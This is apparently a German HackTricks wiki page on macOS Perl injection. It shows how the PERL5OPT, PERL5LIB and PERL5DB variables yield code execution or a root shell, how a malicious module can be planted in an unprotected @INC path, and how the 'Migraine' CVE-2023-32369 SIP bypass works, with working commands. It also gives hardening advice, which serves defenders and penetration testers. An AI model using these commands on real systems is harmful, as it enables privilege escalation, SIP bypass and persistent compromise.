# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Über die Umgebungsvariablen `PERL5OPT` und `PERL5LIB`

Mithilfe der Umgebungsvariablen **`PERL5OPT`** ist es möglich, **Perl** dazu zu bringen, beim Start beliebige Befehle auszuführen (sogar **bevor** die erste Zeile des Zielskripts geparst wird).
Erstelle beispielsweise dieses Skript:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Exportiere nun die **Umgebungsvariable** und führe das **Perl**-Skript aus:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Eine weitere Option besteht darin, ein Perl-Modul (z. B. `/tmp/pmod.pm`) zu erstellen:
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Und verwenden Sie anschließend die Umgebungsvariablen, damit das Modul automatisch gefunden und geladen wird:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Weitere interessante Umgebungsvariablen

- **`PERL5DB`** – wenn der Interpreter mit dem **`-d`**-Flag (Debugger) gestartet wird, wird der Inhalt von `PERL5DB` als Perl-Code *innerhalb* des Debugger-Kontexts ausgeführt.
Wenn du sowohl die Umgebung **als auch** die Kommandozeilen-Flags eines privilegierten Perl-Prozesses beeinflussen kannst, kannst du Folgendes tun:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

- **`PERL5SHELL`** – unter Windows steuert diese Variable, welches Shell-Executable Perl verwendet, wenn es eine Shell starten muss. Sie wird hier nur der Vollständigkeit halber erwähnt, da sie für macOS nicht relevant ist.

Obwohl `PERL5DB` den **`-d`**-Schalter benötigt, findet man häufig Wartungs- oder Installationsskripte, die als *root* mit aktiviertem Flag zur ausführlichen Fehlerbehebung ausgeführt werden, wodurch die Variable einen gültigen Escalation-Vektor darstellt.

## Über dependencies (@INC abuse)

Es ist möglich, den Include-Pfad aufzulisten, den Perl durchsuchen wird (**`@INC`**), indem man Folgendes ausführt:
```bash
perl -e 'print join("\n", @INC)'
```
Typische Ausgabe unter macOS 13/14 sieht wie folgt aus:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Einige der zurückgegebenen Ordner existieren nicht einmal. **`/Library/Perl/5.30`** existiert jedoch, wird *nicht* durch SIP geschützt und befindet sich *vor* den durch SIP geschützten Ordnern. Wenn du daher als *root* schreiben kannst, kannst du ein bösartiges Modul (z. B. `File/Basename.pm`) ablegen, das von jedem privilegierten Script, das dieses Modul importiert, *bevorzugt* geladen wird.

> [!WARNING]
> Du benötigst weiterhin **root**, um in `/Library/Perl` zu schreiben. macOS zeigt außerdem eine **TCC**-Eingabeaufforderung an, die nach *Full Disk Access* für den Prozess fragt, der den Schreibvorgang ausführt.

Wenn ein Script beispielsweise **`use File::Basename;`** importiert, wäre es möglich, `/Library/Perl/5.30/File/Basename.pm` mit vom Angreifer kontrolliertem Code zu erstellen.

## SIP-Umgehung über den Migrationsassistenten (CVE-2023-32369 „Migraine“)

Im Mai 2023 veröffentlichte Microsoft Informationen zu **CVE-2023-32369**, mit dem Spitznamen **Migraine** – einer post-exploitation technique, die es einem *root*-Angreifer ermöglicht, den **System Integrity Protection (SIP)** vollständig zu **umgehen**.
Die verwundbare Komponente ist **`systemmigrationd`**, ein Daemon mit der Berechtigung **`com.apple.rootless.install.heritable`**. Jeder von diesem Daemon gestartete Kindprozess erbt diese Berechtigung und läuft daher **außerhalb** der SIP-Einschränkungen.<sup>[[1]](#references)</sup>

Zu den von den Forschern identifizierten Kindprozessen gehört der von Apple signierte Interpreter:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Da Perl `PERL5OPT` berücksichtigt (und Bash `BASH_ENV` berücksichtigt), reicht es in einem Kontext ohne SIP aus, die *Umgebung* des Daemons zu vergiften, um beliebige Ausführung zu erlangen:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wenn `migrateLocalKDC` ausgeführt wird, startet `/usr/bin/perl` mit dem schädlichen `PERL5OPT` und führt `/private/tmp/migraine.sh` aus, *bevor SIP wieder aktiviert wird*. Über dieses Script können Sie beispielsweise einen payload nach **`/System/Library/LaunchDaemons`** kopieren oder das erweiterte Attribut `com.apple.rootless` zuweisen, um eine Datei **nicht löschbar** zu machen.

Apple hat das Problem in macOS **Ventura 13.4**, **Monterey 12.6.6** und **Big Sur 11.7.7** behoben, aber ältere oder nicht gepatchte Systeme bleiben ausnutzbar.<sup>[[1]](#references)</sup>

## Empfehlungen zur Absicherung

1. **Gefährliche Variablen löschen** – privilegierte launchdaemons oder cron jobs sollten mit einer sauberen Umgebung starten (`launchctl unsetenv PERL5OPT`, `env -i` usw.).
2. **Interpreter nicht als root ausführen**, sofern dies nicht unbedingt erforderlich ist. Verwenden Sie kompilierte Binaries oder reduzieren Sie die Berechtigungen frühzeitig.
3. **Scripts mit `-T` (taint mode) versehen**, damit Perl `PERL5OPT` und andere unsichere Schalter ignoriert, wenn taint checking aktiviert ist.
4. **macOS aktuell halten** – „Migraine“ ist in aktuellen Releases vollständig gepatcht.

## Referenzen

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
